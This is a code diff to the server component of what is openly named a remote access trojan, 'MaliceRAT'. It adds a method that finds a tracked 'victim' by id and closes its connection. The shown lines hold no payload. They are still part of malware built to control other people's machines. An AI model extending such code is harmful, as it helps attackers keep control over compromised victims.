@@ -21,7 +21,7 @@ namespace MaliceRAT.RatServer
         private const int Port = 6666;
         private List<Victim> victims = new List<Victim>();
         private Dictionary<int, Task> clientTasks = new Dictionary<int, Task>();
-        
+
         public Server()
         {
         }
@@ -108,6 +108,22 @@ namespace MaliceRAT.RatServer
                 
                 heartbeatTimer.Stop();
                 OnClientDisconnected(client);
+            }
+        }
+        public void DisconnectClient(int id)
+        {
+            Victim client = null;
+            foreach (var v in victims)
+            {
+                if (v.Id == id)
+                {
+                    client = v;
+                    break;
+                }
+            }
+            if (client != null)
+            {
+                client.TcpClient.Close();
             }
         }
 
